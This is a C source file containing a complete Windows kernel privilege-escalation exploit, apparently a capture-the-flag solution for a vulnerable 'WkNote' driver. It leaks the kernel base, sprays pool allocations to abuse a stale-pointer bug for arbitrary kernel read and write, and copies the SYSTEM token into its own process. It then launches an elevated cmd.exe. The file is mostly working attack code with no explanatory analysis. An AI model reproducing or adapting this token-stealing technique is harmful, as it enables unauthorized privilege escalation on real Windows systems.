#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>

static const int SystemModuleInformation = 11;
static const NTSTATUS STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;
static const size_t AbsPsInitialSystemProcess = 0x140D1EA20 - 0x140000000;

typedef struct _SYSTEM_MODULE_ENTRY {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
  ULONG Count;
  SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#define IOCTL_WKNOTE_SELECT                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_WKNOTE_ALLOCATE                                                  \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_WKNOTE_REMOVE                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct {
  UINT16 Id;
  ULONG Size;
} WKNOTE_IOREQ, *PWKNOTE_IOREQ;

#define MAX_ENT 4

typedef struct NoteEnt {
  PCHAR Buf;
  ULONG nSpace, nWritten;
} NOTE_ENT, *PNOTE_ENT;

typedef char KMUTEX[56];

typedef struct NoteRoot {
  NOTE_ENT Entry[MAX_ENT];
  KMUTEX Lock;
} NOTE_ROOT, *PNOTE_ROOT;

static_assert(sizeof(NOTE_ROOT) == 0x78);

static const size_t OffsetOfEPROCESSProcessListEntry = 0x350;
static const size_t OffsetOfEPROCESSToken = 0x4b8;
static const size_t OffsetOfEPROCESSImageFileName = 0x5a8;

static HANDLE OpenDevice(void) {
  HANDLE hDevice = CreateFile(
      /* lpFileName */ "\\\\.\\WkNote",
      /* dwDesiredAccess */ GENERIC_READ | GENERIC_WRITE,
      /* dwShareMode */ 0,
      /* lpSecurityAttributes */ NULL,
      /* dwCreationDisposition */ OPEN_EXISTING,
      /* dwFlagsAndAttributes */ FILE_ATTRIBUTE_NORMAL,
      /* hTemplateFile */ NULL);
  assert(hDevice != INVALID_HANDLE_VALUE);
  return hDevice;
}

static void Select(HANDLE hDevice, UINT16 Id) {
  WKNOTE_IOREQ Req = {.Id = Id, .Size = 0};
  BOOL bOk = DeviceIoControl(
      /* hDevice */ hDevice,
      /* dwIoControlCode */ IOCTL_WKNOTE_SELECT,
      /* lpInBuffer */ &Req,
      /* nInBufferSize */ sizeof(Req),
      /* lpOutBuffer */ NULL,
      /* nOutBufferSize */ 0,
      /* lpBytesReturned */ NULL,
      /* lpOverlapped */ NULL);
  assert(bOk);
}

static void Allocate(HANDLE hDevice, UINT16 Id, ULONG Size) {
  WKNOTE_IOREQ Req = {.Id = Id, .Size = Size};
  BOOL bOk = DeviceIoControl(
      /* hDevice */ hDevice,
      /* dwIoControlCode */ IOCTL_WKNOTE_ALLOCATE,
      /* lpInBuffer */ &Req,
      /* nInBufferSize */ sizeof(Req),
      /* lpOutBuffer */ NULL,
      /* nOutBufferSize */ 0,
      /* lpBytesReturned */ NULL,
      /* lpOverlapped */ NULL);
  assert(bOk);
}

static void Remove(HANDLE hDevice, UINT16 Id) {
  WKNOTE_IOREQ Req = {.Id = Id, .Size = 0};
  BOOL bOk = DeviceIoControl(
      /* hDevice */ hDevice,
      /* dwIoControlCode */ IOCTL_WKNOTE_REMOVE,
      /* lpInBuffer */ &Req,
      /* nInBufferSize */ sizeof(Req),
      /* lpOutBuffer */ NULL,
      /* nOutBufferSize */ 0,
      /* lpBytesReturned */ NULL,
      /* lpOverlapped */ NULL);
  assert(bOk);
}

static PVOID GetNtoskrnl(void) {
  ULONG miLength;
  NTSTATUS ntStatus = NtQuerySystemInformation(
      /* SystemInformationClass */ SystemModuleInformation,
      /* SystemInformation */ NULL,
      /* SystemInformationLength */ 0,
      /* ReturnLength */ &miLength);
  assert(ntStatus == STATUS_INFO_LENGTH_MISMATCH);
  PSYSTEM_MODULE_INFORMATION mi = malloc(miLength);
  assert(mi != NULL);
  ntStatus = NtQuerySystemInformation(
      /* SystemInformationClass */ SystemModuleInformation,
      /* SystemInformation */ mi,
      /* SystemInformationLength */ miLength,
      /* ReturnLength */ NULL);
  assert(NT_SUCCESS(ntStatus));
  assert(strcmp((char *)(mi->Module[0].FullPathName +
                         mi->Module[0].OffsetToFileName),
                "ntoskrnl.exe") == 0);
  return mi->Module[0].ImageBase;
}

static HANDLE hGen3Spray[10];

static void ReadMem(HANDLE hj, NOTE_ROOT *model, void *kaddr, void *uaddr,
                    size_t size) {
  printf("Write a root into each of these buffers.\n");
  printf("Preserve the KMUTEX data.\n");
  NOTE_ROOT root;
  memcpy(&root, model, sizeof(root));
  root.Entry[MAX_ENT - 1].Buf = kaddr;
  root.Entry[MAX_ENT - 1].nSpace = root.Entry[MAX_ENT - 1].nWritten = 0xfff;
  for (size_t k = 0; k < sizeof(hGen3Spray) / sizeof(hGen3Spray[0]); k++) {
    for (size_t l = 0; l < MAX_ENT; l++) {
      Select(hGen3Spray[k], l);
      DWORD BytesWritten = 0;
      BOOL bOk =
          WriteFile(hGen3Spray[k], &root, sizeof(root), &BytesWritten, NULL);
      assert(bOk && BytesWritten == sizeof(root));
    }
  }

  printf("Read.\n");
  Select(hj, MAX_ENT - 1);
  DWORD bytesRead = 0;
  BOOL bOk = ReadFile(hj, uaddr, size, &bytesRead, NULL);
  assert(bOk && bytesRead == size);
}

static void WriteMem(HANDLE hj, NOTE_ROOT *model, void *kaddr, void *uaddr,
                     size_t size) {
  printf("Write a root into each of these buffers.\n");
  printf("Preserve the KMUTEX data.\n");
  NOTE_ROOT root;
  memcpy(&root, model, sizeof(root));
  root.Entry[MAX_ENT - 1].Buf = kaddr;
  root.Entry[MAX_ENT - 1].nSpace = root.Entry[MAX_ENT - 1].nWritten = 0xfff;
  for (size_t k = 0; k < sizeof(hGen3Spray) / sizeof(hGen3Spray[0]); k++) {
    for (size_t l = 0; l < MAX_ENT; l++) {
      Select(hGen3Spray[k], l);
      DWORD BytesWritten = 0;
      BOOL bOk =
          WriteFile(hGen3Spray[k], &root, sizeof(root), &BytesWritten, NULL);
      assert(bOk && BytesWritten == sizeof(root));
    }
  }

  printf("Read.\n");
  Select(hj, MAX_ENT - 1);
  DWORD bytesWritten = 0;
  BOOL bOk = WriteFile(hj, uaddr, size, &bytesWritten, NULL);
  assert(bOk && bytesWritten == size);
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);

  PVOID ntoskrnl = GetNtoskrnl();
  printf("ntoskrnl = %p\n", ntoskrnl);

  NOTE_ROOT ntoskrnlRoot;
  memset(&ntoskrnlRoot, 0, sizeof(ntoskrnlRoot));
  ntoskrnlRoot.Entry[MAX_ENT - 1].Buf = ntoskrnl;
  ntoskrnlRoot.Entry[MAX_ENT - 1].nSpace =
      ntoskrnlRoot.Entry[MAX_ENT - 1].nWritten = 0xfff;

  printf("\n"
         "Opening bufferless devices for the future.\n");
  for (size_t i = 0; i < sizeof(hGen3Spray) / sizeof(hGen3Spray[0]); i++) {
    hGen3Spray[i] = OpenDevice();
  }

  printf("\n"
         "Generate a number of free chunks.\n"
         "50%% point to other chunks, 50%% point to ntoskrnl.\n");
  HANDLE hGen1Spray[10];
  for (size_t i = 0; i < sizeof(hGen1Spray) / sizeof(hGen1Spray[0]); i++) {
    hGen1Spray[i] = OpenDevice();
    Allocate(hGen1Spray[i], MAX_ENT - 1, sizeof(NOTE_ROOT));
    Select(hGen1Spray[i], MAX_ENT - 1);
    DWORD BytesWritten = 0;
    BOOL bOk = WriteFile(hGen1Spray[i], &ntoskrnlRoot, sizeof(ntoskrnlRoot),
                         &BytesWritten, NULL);
    assert(bOk && BytesWritten == sizeof(ntoskrnlRoot));
  }
  for (size_t i = 0; i < sizeof(hGen1Spray) / sizeof(hGen1Spray[0]); i++) {
    BOOL bOk = CloseHandle(hGen1Spray[i]);
    assert(bOk);
  }

  printf("\n"
         "Reallocate these chunks as roots; mark each one with the\n"
         "respective handle's index.\n");
  struct {
    HANDLE h;
    union {
      NOTE_ROOT root;
      char buf[sizeof(NOTE_ROOT)];
    } leak;
  } gen2Spray[sizeof(hGen1Spray) / sizeof(hGen1Spray[0]) * 2];
  for (size_t i = 0; i < sizeof(gen2Spray) / sizeof(gen2Spray[0]); i++) {
    gen2Spray[i].h = OpenDevice();
    Allocate(gen2Spray[i].h, MAX_ENT - 2, 0xfff - i);
  }

  printf("\n"
         "BUG: roots are reallocated with old buffer pointers.\n"
         "BUG: it's possible to read from such roots.\n"
         "Leak data.\n");
  for (size_t i = 0; i < sizeof(gen2Spray) / sizeof(gen2Spray[0]); i++) {
    Select(gen2Spray[i].h, MAX_ENT - 1);
    memset(&gen2Spray[i].leak, 0, sizeof(gen2Spray[i].leak));
    DWORD bytesRead = 0;
    BOOL bOk = ReadFile(gen2Spray[i].h, &gen2Spray[i].leak,
                        sizeof(gen2Spray[i].leak), &bytesRead, NULL);
    if (bOk && gen2Spray[i].leak.buf[0] == 'M' &&
        gen2Spray[i].leak.buf[1] == 'Z') {
      printf("Fix ntoskrnl root %zu.\n", i);
      Allocate(gen2Spray[i].h, MAX_ENT - 1, 0xfff);
    }
  }

  printf("\n"
         "Find roots that point to other roots.\n");
  for (size_t i = 0; i < sizeof(gen2Spray) / sizeof(gen2Spray[0]); i++) {
    size_t j = 0xfff - gen2Spray[i].leak.root.Entry[MAX_ENT - 2].nSpace;
    if (j >= sizeof(gen2Spray) / sizeof(gen2Spray[0])) {
      continue;
    }
    printf("%zu -> %zu.\n", i, j);
    printf("Free %zu's storage.\n", j);
    Remove(gen2Spray[i].h, MAX_ENT - 1);

    printf("Allocate a number of buffers.\n");
    for (size_t k = 0; k < sizeof(hGen3Spray) / sizeof(hGen3Spray[0]); k++) {
      for (size_t l = 0; l < MAX_ENT; l++) {
        Allocate(hGen3Spray[k], l, sizeof(NOTE_ROOT));
      }
    }

    printf("Trying arbitrary read...\n");
    char leak[2];
    ReadMem(gen2Spray[j].h, &gen2Spray[i].leak.root, ntoskrnl, leak,
            sizeof(leak));
    if (leak[0] != 'M' || leak[1] != 'Z') {
      printf("Retrying...\n");
      return main();
    }

    void *PsInitialSystemProcess;
    ReadMem(gen2Spray[j].h, &gen2Spray[i].leak.root,
            ntoskrnl + AbsPsInitialSystemProcess, &PsInitialSystemProcess,
            sizeof(PsInitialSystemProcess));
    printf("PsInitialSystemProcess = %p\n", PsInitialSystemProcess);

    void *Token;
    ReadMem(gen2Spray[j].h, &gen2Spray[i].leak.root,
            PsInitialSystemProcess + OffsetOfEPROCESSToken, &Token,
            sizeof(Token));
    printf("Token = %p\n", Token);

    void *Process = PsInitialSystemProcess;
    do {
      char Image[16] = {};
      ReadMem(gen2Spray[j].h, &gen2Spray[i].leak.root,
              Process + OffsetOfEPROCESSImageFileName, Image,
              sizeof(Image) - 1);
      printf("Process = %p %s\n", Process, Image);

      if (strcmp(Image, "pwnit.exe") == 0) {
        WriteMem(gen2Spray[j].h, &gen2Spray[i].leak.root,
                 Process + OffsetOfEPROCESSToken, &Token, sizeof(Token));
        printf("ok\n");
        system("cmd.exe");
        Sleep(10000);
      }

      void *ListEntry;
      ReadMem(gen2Spray[j].h, &gen2Spray[i].leak.root,
              Process + OffsetOfEPROCESSProcessListEntry, &ListEntry,
              sizeof(ListEntry));
      Process = ListEntry - OffsetOfEPROCESSProcessListEntry;
    } while (Process != PsInitialSystemProcess);

    printf("Done.\n");
    __builtin_trap();
  }
}